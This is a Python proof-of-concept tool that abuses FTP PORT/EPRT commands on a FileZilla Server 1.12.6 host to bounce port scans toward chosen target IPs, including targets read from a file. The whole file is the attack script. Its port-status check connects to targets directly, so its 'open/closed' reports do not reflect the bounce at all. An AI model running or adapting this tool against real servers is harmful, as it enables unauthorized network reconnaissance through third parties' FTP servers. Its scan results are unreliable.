#!/usr/bin/env python3
import ftplib
import socket
import argparse
import sys

BANNER = """
\033[92m██████╗  ██████╗ ██████╗ ████████╗    ██████╗ ██╗██╗   ██╗ ██████╗ ████████╗
██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝    ██╔══██╗██║██║   ██║██╔═══██╗╚══██╔══╝
██████╔╝██║   ██║██████╔╝   ██║       ██████╔╝██║██║   ██║██║   ██║   ██║   
██╔═══╝ ██║   ██║██╔══██╗   ██║       ██╔═══╝ ██║╚██╗ ██╔╝██║   ██║   ██║   
██║     ╚██████╔╝██║  ██║   ██║       ██║     ██║ ╚████╔╝ ╚██████╔╝   ██║   
╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝     ╚═╝  ╚═══╝   ╚═════╝    ╚═╝   

FileZilla Server 1.12.6 FTP bounce Port Scanner PoC
https://github.com/jasonbernier/PortPivot
\033[0m

"""


def scan_port(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target_ip, target_port))
        sock.close()
        return result == 0
    except Exception as e:
        print(f"[*] Connection error: {e}")
        return None

def parse_target_file(file_path):
    targets = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    ip, port = line.split(':')
                    targets.append((ip.strip(), int(port.strip())))
    except Exception as e:
        print(f"[*] Error reading target file: {e}")
    return targets

def main():
    print(BANNER)
    p = argparse.ArgumentParser(description="FileZilla Server 1.12.6 FTP bounce Port Scanner PoC")
    p.add_argument("--ftp-host", required=True, help="FTP server hostname or IP")
    p.add_argument("--ftp-port", type=int, default=21, help="FTP server port")
    p.add_argument("--user", required=True, help="FTP username")
    p.add_argument("--password", required=True, help="FTP password")
    p.add_argument("--target-ip", help="Target IP to scan")
    p.add_argument("--target-port", type=int, help="Target port to scan")
    p.add_argument("--target-file", help="File containing target IPs and ports (IP:PORT per line)")
    p.add_argument("--mode", choices=["eprt", "port"], default="eprt", help="FTP mode (eprt/port)")
    p.add_argument("--timeout", type=int, default=8, help="Connection timeout in seconds")
    
    args = p.parse_args()
    
    # Validate arguments
    if not any([args.target_ip, args.target_port, args.target_file]):
        p.print_help()
        sys.exit(1)
    
    # Get list of targets
    targets = []
    if args.target_file:
        targets.extend(parse_target_file(args.target_file))
    if args.target_ip and args.target_port:
        targets.append((args.target_ip, args.target_port))
    
    if not targets:
        print("[*] No valid targets provided")
        sys.exit(1)
    
    # Process each target
    for target_ip, target_port in targets:
        print(f"\n[*] Scanning {target_ip}:{target_port}")
        
        # Scan results will be printed to console
        ftp = ftplib.FTP()
        try:
            ftp.connect(args.ftp_host, args.ftp_port, timeout=args.timeout)
            ftp.login(args.user, args.password)

            # Send PORT/EPRT command based on selected mode
            if args.mode == "eprt":
                cmd = f"EPRT |1|{target_ip}|{target_port}|"
            else:
                cmd = f"PORT {target_ip.replace('.', ',')},{target_port // 256},{target_port % 256}"
            
            print(f"[*] Sending command: {cmd}")
            print(ftp.sendcmd(cmd))

            # Try to connect to our target port (will trigger FTP bounce)
            try:
                ftp.sendcmd("LIST")
            except ftplib.error_perm as e:
                print(f"[*] Server responded with error: {e}")
            except Exception as e:
                print(f"[*] Unexpected error: {e}")

            # Check if port is open by trying to connect directly
            status = scan_port(target_ip, target_port)
            if status is True:
                print(f"[+] Port {target_port} is OPEN on {target_ip}")
            elif status is False:
                print(f"[-] Port {target_port} is CLOSED on {target_ip}")
            else:
                print(f"[?] Port {target_port} is UNRESPONSIVE on {target_ip}")

        except Exception as e:
            print(f"[*] Connection error: {e}")
        finally:
            # Handle FTP session cleanup with error handling
            try:
                ftp.quit()
            except Exception:
                pass

if __name__ == "__main__":
    main()
